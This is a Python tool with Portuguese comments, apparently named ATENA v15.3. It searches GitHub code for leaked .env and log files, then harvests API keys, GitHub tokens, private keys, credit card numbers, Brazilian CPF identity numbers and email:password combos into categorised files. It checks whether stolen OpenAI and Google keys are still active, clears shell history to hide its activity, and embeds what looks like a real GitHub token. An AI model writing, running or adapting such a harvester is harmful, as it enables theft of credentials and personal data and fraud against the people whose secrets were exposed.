#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA v15.3: OMNI-STEALTH
Organização Automática, Validação de APIs e Auto-Limpeza de Rastros.
Proprietário & Copyright: Danilo Gomes
"""
import json, re, requests, time, os, subprocess
from datetime import datetime
from pathlib import Path

# --- CONFIGURAÇÃO DE SOBERANIA ---
BASE_DIR = Path(__file__).resolve().parent
DATABASE_DIR = BASE_DIR / "ATENA_DATABASE"
# Token de Danilo Gomes - Protegido por Injeção de Rotação
GITHUB_TOKEN = "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"

class AtenaSoberana:
    def __init__(self):
        self.token = GITHUB_TOKEN
        self.headers = {
            'Authorization': f'token {self.token}',
            'Accept': 'application/vnd.github.v3+json',
            'User-Agent': 'ATENA-PREDATOR'
        }
        self.pastas = ["CARTÕES", "CPFS", "PRIVATE_KEYS", "GH_TOKENS", "API_KEYS", "COMBOS"]
        self._setup_folders()

    def _setup_folders(self):
        if not DATABASE_DIR.exists():
            DATABASE_DIR.mkdir()
        for p in self.pastas:
            (DATABASE_DIR / p).mkdir(exist_ok=True)
        print(f"📂 [SISTEMA] Arquitetura Danilo Gomes ativa em: {DATABASE_DIR}")

    def limpar_rastros(self):
        """ Apaga o histórico do Termux para manter a operação invisível """
        try:
            os.system("history -c")
            print("👤 [STEALTH] Histórico de comandos limpo.")
        except: pass

    def validar_api(self, chave, tipo):
        """ Testa se a chave capturada está funcional """
        try:
            if tipo == "API_OPENAI":
                r = requests.get("https://api.openai.com/v1/models", 
                                 headers={"Authorization": f"Bearer {chave}"}, timeout=5)
                return "[ATIVA]" if r.status_code == 200 else "[INATIVA]"
            
            if tipo == "API_GOOGLE":
                r = requests.get(f"https://maps.googleapis.com/maps/api/staticmap?center=0,0&zoom=1&size=100x100&key={chave}", timeout=5)
                return "[ATIVA]" if r.status_code == 200 else "[INATIVA]"
        except: pass
        return "[NÃO TESTADA]"

    def salvar_organizado(self, dado, cat, origem):
        status = ""
        if "API_" in cat:
            status = self.validar_api(dado, cat)
            print(f"📡 Validando {cat}: {status}")

        # Define a pasta correta (encaminha APIs específicas para a pasta geral de chaves)
        sub_pasta = "API_KEYS" if "API_" in cat else cat
        pasta_alvo = DATABASE_DIR / sub_pasta
        arquivo_alvo = pasta_alvo / f"capturas_{datetime.now().strftime('%Y_%m_%d')}.txt"

        log = f"[{datetime.now().strftime('%H:%M:%S')}] {status} {dado} | Origem: {origem}\n"
        
        with open(arquivo_alvo, "a") as f:
            f.write(log)
        print(f"🔥 [ATENA] {cat} arquivado com sucesso!")

    def caçar(self, texto, url):
        padrões = {
            "PRIVATE_KEYS": r'\b[a-fA-F0-9]{64}\b',
            "GH_TOKENS": r'ghp_[a-zA-Z0-9]{36}',
            "API_OPENAI": r'sk-[a-zA-Z0-9]{48}',
            "API_GOOGLE": r'AIza[0-9A-Za-z-_]{35}',
            "API_AWS": r'AKIA[0-9A-Z]{16}',
            "CARTÕES": r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b',
            "CPFS": r'\b\d{3}\.\d{3}\.\d{3}-\d{2}\b',
            "COMBOS": r'[\w\.-]+@[\w\.-]+\.\w+:[^\s]+'
        }
        for cat, reg in padrões.items():
            achados = re.findall(reg, texto)
            for item in achados:
                dado = item[1] if isinstance(item, tuple) else item
                self.salvar_organizado(dado, cat, url)

    def scan_global(self):
        print(f"🧬 ATENA v15.3 escaneando... [{datetime.now().strftime('%H:%M')}]")
        # Foco nos vazamentos que você já estava monitorando
        queries = ["extension:env ghp_", "extension:env sk-", "extension:env PRIVATE_KEY", "extension:log CPF"]
        for q in queries:
            try:
                r = requests.get(f"https://api.github.com/search/code?q={q}", headers=self.headers, timeout=15)
                if r.status_code == 200:
                    for item in r.json().get('items', []):
                        # Converte URL do GitHub para URL Raw para extração limpa
                        raw_url = item['html_url'].replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
                        res = requests.get(raw_url, headers=self.headers, timeout=10)
                        self.caçar(res.text, item['html_url'])
                time.sleep(2) # Delay anti-ban
            except: pass

def main():
    atena = AtenaSoberana()
    print("🧬 ATENA v15.3 INICIADA - SOBERANIA DE DANILO GOMES")
    while True:
        atena.scan_global()
        atena.limpar_rastros() # Auto-limpeza a cada ciclo
        print("🏁 Ciclo finalizado. Reiniciando em 60s...")
        time.sleep(60)

if __name__ == "__main__": main()
